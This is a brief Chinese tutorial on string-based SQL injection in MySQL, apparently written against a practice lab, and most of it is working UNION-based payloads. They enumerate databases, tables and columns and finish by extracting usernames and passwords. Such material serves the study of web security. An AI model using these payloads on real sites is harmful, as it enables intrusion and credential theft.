MySQL中的information_schema數據庫表說明:SCHEMATA表：提供了當前MySQL實例中所有數據庫的信息。是show databases的結果取之此表。TABLES表：提供了關於數據庫中的表的信息（包括視圖）。詳細表述了某個表屬於哪個schema，表類型，表引擎，創建時間等信息。是show tables from schemaname的結果取之此表。COLUMNS表：提供了表中的列信息。詳細表述了某張表的所有列以及每個列的信息。是show columns from schemaname.tablename的結果取之此表。

1.字符型SQL注入的關鍵是單引號的閉合

2.MySQL數據庫對於單引號的規則如下：

單引號必須成對出現，否則數據庫就會報錯。如果兩個單引號之間內容為空，數據庫自動忽略。

3.如何判斷是否是字符型注入

id=xx'id=xx''

如果第一個頁面出現錯誤則，而使用第二個的時候頁面正常，該url可以進行字符型注入。

第二次測試

4.猜字段數

方法一：

id=1' union select 1,2,3,4 --+

這是可以看到頁面顯示不正常，我們減少union select後面跟的參數

id=1' union select 1,2,3 --+


此時頁面顯示正常，我們可以得知共有3個字段

方法二：

index.php?id=1' order by 3--+

index.php?id=1' order by 4--+

4.使用聯合查詢查看頁面是否有顯示位

index.php?id=-1' union select 1,2,3--+

這裡需要注意的是id的值需要是一個數據庫中不存在的值，這樣顯示位才會顯示我們後面聯合查詢中的數據。


5.爆出數據庫版本和當前數據庫名

index.php?id=-1' union select 1,version(),database()--+

6.爆出所有數據庫

index.php?id=-1' union select 1,group_concat(schema_name),3 from information_schema.schemata--+

7.爆出當前數據庫所有表

index.php?id=-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema="security"--+

成功爆出security庫中所有表

8.查詢當前數據庫users表所有字段

index.php?id=-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users' --+

成功爆出users表中所有字段

9.查詢數據

index.php?id=-1' union select 1,group_concat(username,":",password),3 from users --+
